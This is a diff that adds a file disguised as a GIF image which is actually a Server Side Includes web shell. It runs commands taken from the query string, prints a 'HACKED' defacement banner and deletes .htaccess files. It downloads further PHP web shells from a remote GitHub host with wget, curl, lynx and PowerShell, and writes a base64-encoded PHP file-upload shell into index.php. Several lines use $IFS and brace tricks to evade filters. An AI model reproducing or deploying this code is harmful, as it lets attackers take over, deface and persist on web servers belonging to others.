@@ -1,0 +1,36 @@
+GIF89a1
+
+<!--#config errmsg="Function SSI Disabled"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami;id;pwd;echo asu > index.html;uname -a;ls -al" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+
+
+
+<!--#echo var="DOCUMENT_ROOT" -->
+<br>
+<!--#echo var="DOCUMENT_URI" -->HACKED HEKED HUKED -./CYBEROOT
+<br>
+<br>
+<!--#echo var="SERVER_ADDR" -->
+<br>
+
+<pre><!--#exec cmd="cd ../../;rm -rf .htaccess" --></pre>
+<pre><!--#exec cmd="cd ../../../;rm -rf .htaccess;wget https://raw.githubusercontent.com/exploit-haxor/webshell/main/bypas1.php -O min.php" --></pre>
+
+<pre><!--#exec cmd="dir;ls" --></pre>
+<pre><!--#exec cmd="rm -rf .htaccess;wget https://raw.githubusercontent.com/exploit-haxor/webshell/main/bypas1.php -O min.php" --></pre>
+
+
+<!--#exec cmd="echo PD9waHAgCmVjaG8gICAnPGNlbnRlcj48Yj5VcGxvYWQgLnppcCBGaWxlIEF1dG8gRXh0cmFjdDxicj5TeXN0ZW0gOiAnLnBocF91bmFtZSgpLic8YnI+PC9jZW50ZXI+PGJyPiAgIFVwbG9hZCB5b3VyIC56aXAgRmlsZS48L2I+ICc7ICAgCmVjaG8gICAnPGZvcm0gICBhY3Rpb249IiIgICBtZXRob2Q9InBvc3QiICAgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgICBuYW1lPSJ1cGxvYWRlciIgICBpZD0idXBsb2FkZXIiPic7ICAgCmVjaG8gICAnPGlucHV0ICAgdHlwZT0iZmlsZSIgICBuYW1lPSJmaWxlIiAgIHNpemU9IjUwIj48aW5wdXQgICBuYW1lPSJfdXBsIiAgIHR5cGU9InN1Ym1pdCIgICBpZD0iX3VwbCIgICB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsgICAKaWYoICAgJF9QT1NUWydfdXBsJ10gICA9PSAgICJVcGxvYWQiICAgKSAgIHsgICAKJGZpbGUgICA9ICAgJF9GSUxFU1snZmlsZSddWyduYW1lJ107ICAgCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgICAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpICAgeyAgIAokemlwICAgPSAgIG5ldyAgIFppcEFyY2hpdmU7ICAgCmlmICAgKCR6aXAtPm9wZW4oJGZpbGUpICAgPT09ICAgVFJVRSkgICB7ICAgCiAgICAgICAgICAgICR6aXAtPmV4dHJhY3RUbygnLi8nKTsgICAKICAgICAgICAgICAgJHppcC0+Y2xvc2UoKTsgICAKZWNobyAgICdZb3VyIC56aXAgZmlsZSB3YXMgdXBsb2FkZWQgYW5kIHVucGFja2VkLic7ICAgCn0gICBlbHNlICAgeyAgIAplY2hvICAgJ1VwbG9hZGVkIGJ1dCBOb3QgRXh0cmFjdGVkISc7ICAgCn0gICAgICAgICAgICAgICAKfWVsc2V7ICAgICAgCmVjaG8gICAnPGI+RmFpbGVkITwvYj48YnI+PGJyPic7ICAgICAgCn0gICAKfSAgIAo/Pg== | base64 -d | tee min.html" -->
+<!--#exec cmd="echo$IFS'PD9waHAgCmVjaG8gICAnPGNlbnRlcj48Yj5VcGxvYWQgLnppcCBGaWxlIEF1dG8gRXh0cmFjdDxicj5TeXN0ZW0gOiAnLnBocF91bmFtZSgpLic8YnI+PC9jZW50ZXI+PGJyPiAgIFVwbG9hZCB5b3VyIC56aXAgRmlsZS48L2I+ICc7ICAgCmVjaG8gICAnPGZvcm0gICBhY3Rpb249IiIgICBtZXRob2Q9InBvc3QiICAgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgICBuYW1lPSJ1cGxvYWRlciIgICBpZD0idXBsb2FkZXIiPic7ICAgCmVjaG8gICAnPGlucHV0ICAgdHlwZT0iZmlsZSIgICBuYW1lPSJmaWxlIiAgIHNpemU9IjUwIj48aW5wdXQgICBuYW1lPSJfdXBsIiAgIHR5cGU9InN1Ym1pdCIgICBpZD0iX3VwbCIgICB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsgICAKaWYoICAgJF9QT1NUWydfdXBsJ10gICA9PSAgICJVcGxvYWQiICAgKSAgIHsgICAKJGZpbGUgICA9ICAgJF9GSUxFU1snZmlsZSddWyduYW1lJ107ICAgCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgICAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpICAgeyAgIAokemlwICAgPSAgIG5ldyAgIFppcEFyY2hpdmU7ICAgCmlmICAgKCR6aXAtPm9wZW4oJGZpbGUpICAgPT09ICAgVFJVRSkgICB7ICAgCiAgICAgICAgICAgICR6aXAtPmV4dHJhY3RUbygnLi8nKTsgICAKICAgICAgICAgICAgJHppcC0+Y2xvc2UoKTsgICAKZWNobyAgICdZb3VyIC56aXAgZmlsZSB3YXMgdXBsb2FkZWQgYW5kIHVucGFja2VkLic7ICAgCn0gICBlbHNlICAgeyAgIAplY2hvICAgJ1VwbG9hZGVkIGJ1dCBOb3QgRXh0cmFjdGVkISc7ICAgCn0gICAgICAgICAgICAgICAKfWVsc2V7ICAgICAgCmVjaG8gICAnPGI+RmFpbGVkITwvYj48YnI+PGJyPic7ICAgICAgCn0gICAKfSAgIAo/Pg=='$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'tee'$IFS'index.php'" -->
+<!--#exec cmd="lynx$IFS-source$IFS'https://raw.githubusercontent.com/exploit-haxor/webshell/master/min.php'$IFS>$IFS'min.pdf'" -->
+<!--#exec cmd="{curl,https://raw.githubusercontent.com/exploit-haxor/webshell/master/min.php,-o,gan.jpg}" -->
+<!--#exec cmd="{wget,https://raw.githubusercontent.com/exploit-haxor/webshell/master/min,-O,min.txt}" -->
+<!--#exec cmd="powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/exploit-haxor/webshell/master/usa.txt','index.php')"" -->
+<br>
+<!--#exec cmd="wget${IFS}https://raw.githubusercontent.com/exploit-haxor/webshell/master/min.php${IFS}-O${IFS}gan.php;cd${IFS};.wget${IFS}https://raw.githubusercontent.com/exploit-haxor/webshell/master/gzip.txt{IFS}-O${IFS}min.phtml" -->
